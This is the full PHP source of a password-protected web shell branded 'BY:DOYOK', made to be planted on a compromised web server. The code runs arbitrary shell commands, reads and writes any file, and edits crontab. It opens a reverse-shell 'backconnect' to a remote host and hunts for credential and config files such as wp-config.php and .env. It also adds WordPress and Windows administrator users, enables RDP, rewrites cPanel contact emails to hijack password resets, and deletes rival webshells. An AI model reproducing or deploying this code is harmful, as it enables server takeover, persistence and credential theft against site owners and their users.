<?php
session_start();
error_reporting(0);

// Login Configuration - CHANGE THESE!
$valid_username = "By:doyok4524$#@";
$valid_password = "By:doyok4524$#@";

// Check if user is logged in
function isLoggedIn() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

// Handle login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($username === $valid_username && $password === $valid_password) {
        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['login_time'] = time();
        $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Invalid username or password!";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Auto-logout after 1 hour of inactivity
if (isLoggedIn() && (time() - $_SESSION['login_time']) > 3600) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// If not logged in, show login page
if (!isLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>DOYOK - KING-UDUD- Login</title>
        <meta charset="UTF-8">
        <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * { 
                margin: 0; 
                padding: 0; 
                box-sizing: border-box; 
            }
            
            body { 
                background-color: black;
                font-family: 'Inter', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #333;
            }
            
            .login-container {
                background: rgba(255, 255, 255, 0.95);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
                width: 100%;
                max-width: 400px;
                backdrop-filter: blur(10px);
            }
            
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .login-header h1 {
                color: #2c3e50;
                margin-bottom: 10px;
                font-size: 28px;
            }
            
            .login-header p {
                color: #7f8c8d;
                font-size: 14px;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .form-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: 500;
                color: #2c3e50;
            }
            
            .form-group input {
                width: 100%;
                padding: 12px 15px;
                border: 2px solid #e1e8ed;
                border-radius: 8px;
                font-size: 14px;
                transition: all 0.3s ease;
                background: #fff;
            }
            
            .form-group input:focus {
                outline: none;
                border-color: #3498db;
                box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
            }
            
            .login-btn {
                width: 100%;
                background: linear-gradient(135deg, #3498db, #2980b9);
                color: white;
                border: none;
                padding: 12px;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(27, 146, 226, 0.3);
            }
            
            .error-message {
                background: #e74c3c;
                color: white;
                padding: 10px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
                font-size: 14px;
            }
            
            .security-notice {
                background: #f8f9fa;
                border: 1px solid #e1e8ed;
                border-radius: 8px;
                padding: 15px;
                margin-top: 20px;
                font-size: 12px;
                color: #7f8c8d;
            }
            
            .image-container {
                width: 100%;
                height: 80px;
                border-radius: 8px;
                overflow: hidden;
                margin-bottom: 20px;
            }
            
            .full-size-image {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="image-container">
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBvN9t_Dc5tJ7dtSCeNpDULpjd_KFPhWX5tFB4XeFej6N4QFNkriicEu1f8ybXw19jtJG3WdjExnwdV0Tv4I74Ni85Z-lw855xOQJX3L4uQmR1AkcnpeOm49yjvAjIym9Dn8LsTz6g7GAzs1rNnYhFs7BYWKn49p9-rZ9cZj21G4h2KOf1cgSk437veyg/s500/redhead_001-2.gif" alt="DOYOK - K I N G - UDUD" class="full-size-image">
            </div>
            
            <div class="login-header">
                <h1><i class="fas fa-terminal"></i>BY:DOYOK</h1>
                <p>Secure Access Required</p>
            </div>
            
            <?php if (isset($login_error)): ?>
                <div class="error-message">
                    <i class="fas fa-exclamation-triangle"></i> <?php echo $login_error; ?>
                </div>
            <?php endif; ?>
            
            <form method="post">
                <div class="form-group">
                    <label for="username"><i class="fas fa-user"></i> Username</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                
                <div class="form-group">
                    <label for="password"><i class="fas fa-lock"></i> Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" name="login" class="login-btn">
                    <i class="fas fa-sign-in-alt"></i> Login
                </button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// MAIN SHELL CODE STARTS
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
if (!is_dir($current_dir)) {
    $current_dir = '.';
}

$home_dir = realpath(dirname(__FILE__));

// Handle AJAX actions
if (isset($_POST['ajax'])) {
    header('Content-Type: application/json');
    
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'execute_command':
                $output = [];
                $return_var = 0;
                @exec($_POST['command'] . ' 2>&1', $output, $return_var);
                echo json_encode([
                    'success' => true,
                    'command' => $_POST['command'],
                    'output' => implode("\n", $output),
                    'return_var' => $return_var
                ]);
                exit;
                
            case 'get_file_content':
                if (isset($_POST['filepath']) && file_exists($_POST['filepath']) && !is_dir($_POST['filepath'])) {
                    echo json_encode([
                        'success' => true,
                        'content' => file_get_contents($_POST['filepath'])
                    ]);
                } else {
                    echo json_encode([
                        'success' => false,
                        'error' => 'File not found'
                    ]);
                }
                exit;
                
            case 'save_file_content':
                if (isset($_POST['filepath']) && isset($_POST['content'])) {
                    if (file_put_contents($_POST['filepath'], $_POST['content']) !== false) {
                        echo json_encode(['success' => true]);
                    } else {
                        echo json_encode(['success' => false, 'error' => 'Failed to save file']);
                    }
                }
                exit;
                
            case 'view_crontab':
                $output = [];
                @exec('crontab -l 2>&1', $output, $return_var);
                if ($return_var !== 0) {
                    echo json_encode([
                        'success' => false,
                        'output' => "No crontab for current user or error reading crontab\n" . implode("\n", $output)
                    ]);
                } else {
                    echo json_encode([
                        'success' => true,
                        'output' => implode("\n", $output)
                    ]);
                }
                exit;
                
            case 'save_crontab':
                if (isset($_POST['crontab_content'])) {
                    $temp_file = tempnam(sys_get_temp_dir(), 'crontab');
                    file_put_contents($temp_file, $_POST['crontab_content']);
                    @exec('crontab ' . escapeshellarg($temp_file) . ' 2>&1', $output, $return_var);
                    @unlink($temp_file);
                    
                    if ($return_var === 0) {
                        echo json_encode([
                            'success' => true,
                            'output' => "Crontab updated successfully!"
                        ]);
                    } else {
                        echo json_encode([
                            'success' => false,
                            'output' => "Error updating crontab: " . implode("\n", $output)
                        ]);
                    }
                }
                exit;

            case 'add_wp_user':
                $username = $_POST['username'] ?? '';
                $password = $_POST['password'] ?? '';
                $email = $_POST['email'] ?? '';
                $role = $_POST['role'] ?? 'subscriber';
                $wp_config_path = $_POST['wp_config_path'] ?? '';
                
                if (!$username || !$password || !$email || !$wp_config_path) {
                    echo json_encode(['success' => false, 'output' => 'All fields are required']);
                    exit;
                }
                
                $output = addWordPressUser($username, $password, $email, $role, $wp_config_path);
                echo json_encode($output);
                exit;

            case 'scan_ports':
                $host = $_POST['host'] ?? 'localhost';
                $ports = $_POST['ports'] ?? '21,22,23,25,53,80,110,115,135,139,143,194,443,445,993,995,1433,3306,3389,5432,5900,6379,27017';
                $output = scanPorts($host, $ports);
                echo json_encode($output);
                exit;

            case 'scan_webshells':
                $scan_path = $_POST['scan_path'] ?? '/var/www';
                $output = scanWebshells($scan_path);
                echo json_encode($output);
                exit;

            case 'delete_webshell':
                $file_path = $_POST['file_path'] ?? '';
                if ($file_path && file_exists($file_path)) {
                    if (unlink($file_path)) {
                        echo json_encode(['success' => true, 'output' => 'File deleted successfully']);
                    } else {
                        echo json_encode(['success' => false, 'output' => 'Failed to delete file']);
                    }
                } else {
                    echo json_encode(['success' => false, 'output' => 'File not found']);
                }
                exit;

            case 'get_webshell_code':
                $file_path = $_POST['file_path'] ?? '';
                if ($file_path && file_exists($file_path)) {
                    $content = file_get_contents($file_path);
                    echo json_encode(['success' => true, 'content' => $content]);
                } else {
                    echo json_encode(['success' => false, 'error' => 'File not found']);
                }
                exit;

            case 'backconnect':
                $host = $_POST['host'] ?? '';
                $port = $_POST['port'] ?? '4444';
                $output = backconnect($host, $port);
                echo json_encode($output);
                exit;

            case 'scan_config_files':
                $scan_path = $_POST['scan_path'] ?? '/var/www';
                $output = scanConfigFiles($scan_path);
                echo json_encode($output);
                exit;

            case 'reset_cpanel':
                $email = $_POST['email'] ?? '';
                $output = resetCpanel($email);
                echo json_encode($output);
                exit;

            case 'zip_files':
                $files = $_POST['files'] ?? [];
                $zip_name = $_POST['zip_name'] ?? 'archive.zip';
                $output = createZip($files, $zip_name, $current_dir);
                echo json_encode($output);
                exit;

            case 'unzip_file':
                $zip_file = $_POST['zip_file'] ?? '';
                $extract_path = $_POST['extract_path'] ?? '';
                $output = extractZip($zip_file, $extract_path);
                echo json_encode($output);
                exit;

            case 'add_rdp_user':
                $username = $_POST['username'] ?? '';
                $password = $_POST['password'] ?? '';
                $output = addRdpUser($username, $password);
                echo json_encode($output);
                exit;

            case 'enable_rdp':
                $output = enableRdp();
                echo json_encode($output);
                exit;
        }
    }
    exit;
}

// WordPress User Function
function addWordPressUser($username, $password, $email, $role, $wp_config_path) {
    if (!file_exists($wp_config_path)) {
        return ['success' => false, 'output' => 'WordPress config file not found'];
    }
    
    $wp_dir = dirname($wp_config_path);
    $wp_load = $wp_dir . '/wp-load.php';
    
    if (!file_exists($wp_load)) {
        return ['success' => false, 'output' => 'WordPress not found in this directory'];
    }
    
    $script = "<?php
define('WP_USE_THEMES', false);
require_once('$wp_load');

if (!function_exists('wp_create_user')) {
    echo 'WordPress functions not available';
    exit;
}

\$user_id = wp_create_user('$username', '$password', '$email');
if (is_wp_error(\$user_id)) {
    echo 'Error: ' . \$user_id->get_error_message();
} else {
    \$user = new WP_User(\$user_id);
    \$user->set_role('$role');
    echo 'User $username created successfully with role: $role';
}
?>";
    
    $temp_script = tempnam(sys_get_temp_dir(), 'wp_user_');
    file_put_contents($temp_script, $script);
    
    $output = [];
    exec("php " . escapeshellarg($temp_script) . " 2>&1", $output);
    unlink($temp_script);
    
    return ['success' => true, 'output' => implode("\n", $output)];
}

// Port Scanner Function
function scanPorts($host, $ports) {
    $port_list = explode(',', $ports);
    $results = [];
    
    foreach ($port_list as $port) {
        $port = trim($port);
        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
        
        if (is_resource($connection)) {
            $results[] = "Port $port: OPEN";
            fclose($connection);
        } else {
            $results[] = "Port $port: CLOSED";
        }
    }
    
    return ['success' => true, 'output' => implode("\n", $results)];
}

// Webshell Scanner Function
function scanWebshells($path) {
    $webshell_patterns = [
        '/eval\s*\(.*base64_decode/',
        '/system\s*\(/',
        '/exec\s*\(/',
        '/shell_exec\s*\(/',
        '/passthru\s*\(/',
        '/popen\s*\(/',
        '/proc_open/',
        '/`.*`/',
        '/assert\s*\(/',
        '/preg_replace\s*\(.*\/e/',
        '/create_function/',
        '/file_put_contents\s*\(.*\$_/',
        '/file_get_contents\s*\(.*\$_/',
        '/curl_exec/',
        '/wget\s+/',
        '/phpinfo\s*\(/'
    ];
    
    $suspicious_files = [];
    
    if (!is_dir($path)) {
        return ['success' => false, 'output' => 'Directory not found'];
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile() && in_array($file->getExtension(), ['php', 'phtml', 'txt', 'html', 'htm'])) {
            $content = file_get_contents($file->getPathname());
            $matches = [];
            
            foreach ($webshell_patterns as $pattern) {
                if (preg_match($pattern, $content)) {
                    $matches[] = $pattern;
                }
            }
            
            if (!empty($matches)) {
                $suspicious_files[] = [
                    'path' => $file->getPathname(),
                    'patterns' => $matches,
                    'size' => $file->getSize()
                ];
            }
        }
    }
    
    return ['success' => true, 'files' => $suspicious_files];
}

// Backconnect Function
function backconnect($host, $port) {
    $sock = @fsockopen($host, $port, $errno, $errstr, 30);
    
    if (!$sock) {
        return ['success' => false, 'output' => "Failed to connect: $errstr ($errno)"];
    }
    
    fwrite($sock, "Backconnect established from " . $_SERVER['REMOTE_ADDR'] . "\n");
    
    while (!feof($sock)) {
        fwrite($sock, "$ ");
        $cmd = fgets($sock);
        
        if (trim($cmd) == 'exit') {
            break;
        }
        
        $output = shell_exec($cmd);
        fwrite($sock, $output);
    }
    
    fclose($sock);
    return ['success' => true, 'output' => 'Backconnect session completed'];
}

// Config File Hunter
function scanConfigFiles($path) {
    $config_patterns = [
        'config.php',
        'configuration.php',
        'wp-config.php',
        'config.inc.php',
        'settings.php',
        '.env',
        'config.json',
        'config.xml',
        'database.yml',
        'database.json',
        'app.config',
        'web.config',
        'config.ini',
        '.htpasswd',
        '.htaccess'
    ];
    
    $found_files = [];
    
    if (!is_dir($path)) {
        return ['success' => false, 'output' => 'Directory not found'];
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $filename = $file->getFilename();
            
            foreach ($config_patterns as $pattern) {
                if (fnmatch($pattern, $filename) || stripos($filename, 'config') !== false) {
                    $found_files[] = [
                        'path' => $file->getPathname(),
                        'size' => $file->getSize(),
                        'modified' => date('Y-m-d H:i:s', $file->getMTime())
                    ];
                    break;
                }
            }
        }
    }
    
    return ['success' => true, 'files' => $found_files];
}

// Reset cPanel Function
function resetCpanel($email) {
    $cpanel_dir = '/home/*/.cpanel/contactinfo';
    $contact_files = glob($cpanel_dir);
    
    if (empty($contact_files)) {
        return ['success' => false, 'output' => 'No cPanel contactinfo files found'];
    }
    
    $results = [];
    foreach ($contact_files as $file) {
        $content = "email: $email\n";
        if (file_put_contents($file, $content) !== false) {
            $results[] = "Updated: $file";
        } else {
            $results[] = "Failed: $file";
        }
    }
    
    return ['success' => true, 'output' => implode("\n", $results)];
}

// Zip Function
function createZip($files, $zip_name, $current_dir) {
    if (empty($files)) {
        return ['success' => false, 'output' => 'No files selected'];
    }
    
    $zip_path = $current_dir . '/' . $zip_name;
    
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
            foreach ($files as $file) {
                $file_path = $current_dir . '/' . $file;
                if (file_exists($file_path)) {
                    if (is_dir($file_path)) {
                        addFolderToZip($zip, $file_path, $file);
                    } else {
                        $zip->addFile($file_path, $file);
                    }
                }
            }
            $zip->close();
            return ['success' => true, 'output' => "Zip file created: $zip_path"];
        } else {
            return ['success' => false, 'output' => 'Failed to create zip file'];
        }
    } else {
        $files_str = implode(' ', array_map('escapeshellarg', $files));
        $command = "cd " . escapeshellarg($current_dir) . " && zip -r " . escapeshellarg($zip_name) . " $files_str 2>&1";
        exec($command, $output, $return_var);
        
        if ($return_var === 0) {
            return ['success' => true, 'output' => "Zip file created: $zip_path\n" . implode("\n", $output)];
        } else {
            return ['success' => false, 'output' => "Failed to create zip file\n" . implode("\n", $output)];
        }
    }
}

function addFolderToZip($zip, $folder, $base_name) {
    $files = scandir($folder);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $file_path = $folder . '/' . $file;
        $local_path = $base_name . '/' . $file;
        
        if (is_dir($file_path)) {
            $zip->addEmptyDir($local_path);
            addFolderToZip($zip, $file_path, $local_path);
        } else {
            $zip->addFile($file_path, $local_path);
        }
    }
}

// Unzip Function
function extractZip($zip_file, $extract_path = null) {
    if (!file_exists($zip_file)) {
        return ['success' => false, 'output' => 'Zip file not found'];
    }
    
    if (!$extract_path) {
        $extract_path = dirname($zip_file);
    }
    
    if (!is_dir($extract_path)) {
        mkdir($extract_path, 0755, true);
    }
    
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zip_file) === TRUE) {
            $zip->extractTo($extract_path);
            $zip->close();
            return ['success' => true, 'output' => "Zip file extracted to: $extract_path"];
        } else {
            return ['success' => false, 'output' => 'Failed to extract zip file'];
        }
    } else {
        $command = "unzip -o " . escapeshellarg($zip_file) . " -d " . escapeshellarg($extract_path) . " 2>&1";
        exec($command, $output, $return_var);
        
        if ($return_var === 0) {
            return ['success' => true, 'output' => "Zip file extracted to: $extract_path\n" . implode("\n", $output)];
        } else {
            return ['success' => false, 'output' => "Failed to extract zip file\n" . implode("\n", $output)];
        }
    }
}

// RDP Functions for Windows
function addRdpUser($username, $password) {
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        return ['success' => false, 'output' => 'This feature is only available on Windows servers'];
    }
    
    $output = [];
    $return_var = 0;
    
    exec("net user " . escapeshellarg($username) . " " . escapeshellarg($password) . " /add 2>&1", $output, $return_var);
    
    if ($return_var !== 0) {
        return ['success' => false, 'output' => "Failed to create user: " . implode("\n", $output)];
    }
    
    exec("net localgroup administrators " . escapeshellarg($username) . " /add 2>&1", $output, $return_var);
    
    if ($return_var !== 0) {
        return ['success' => false, 'output' => "User created but failed to add to administrators: " . implode("\n", $output)];
    }
    
    return ['success' => true, 'output' => "User $username created and added to administrators group"];
}

function enableRdp() {
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        return ['success' => false, 'output' => 'This feature is only available on Windows servers'];
    }
    
    $output = [];
    $return_var = 0;
    
    exec('reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1', $output, $return_var);
    
    if ($return_var !== 0) {
        return ['success' => false, 'output' => "Failed to enable RDP: " . implode("\n", $output)];
    }
    
    exec('netsh advfirewall firewall set rule group="remote desktop" new enable=Yes 2>&1', $output, $return_var);
    
    return ['success' => true, 'output' => "RDP enabled and firewall configured"];
}

// Handle normal actions
if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'download':
            if (isset($_GET['file']) && file_exists($_GET['file'])) {
                $file = $_GET['file'];
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                readfile($file);
                exit;
            }
            break;
            
        case 'delete':
            if (isset($_GET['file'])) {
                if (is_dir($_GET['file'])) {
                    @rmdir($_GET['file']);
                } else {
                    @unlink($_GET['file']);
                }
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'chmod':
            if (isset($_GET['file']) && isset($_GET['perm'])) {
                @chmod($_GET['file'], octdec($_GET['perm']));
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
    }
}

if (isset($_POST['action']) && !isset($_POST['ajax'])) {
    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
                $target = $current_dir . '/' . $_FILES['file']['name'];
                @move_uploaded_file($_FILES['file']['tmp_name'], $target);
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'mkdir':
            if (isset($_POST['dirname']) && !empty($_POST['dirname'])) {
                @mkdir($current_dir . '/' . $_POST['dirname'], 0755);
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'newfile':
            if (isset($_POST['filename']) && !empty($_POST['filename'])) {
                $filepath = $current_dir . '/' . $_POST['filename'];
                @file_put_contents($filepath, $_POST['filecontent'] ?? '');
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
            
        case 'rename':
            if (isset($_POST['oldname']) && isset($_POST['newname'])) {
                @rename($_POST['oldname'], $_POST['newname']);
                header('Location: ?dir='.urlencode($current_dir));
                exit;
            }
            break;
    }
}

// Function to check if directory is writable
function is_writable_dir($dir) {
    if (!is_dir($dir)) return false;
    
    $test_file = $dir . '/test_' . uniqid() . '.tmp';
    $result = @file_put_contents($test_file, 'test');
    if ($result !== false) {
        @unlink($test_file);
        return true;
    }
    return false;
}
?>
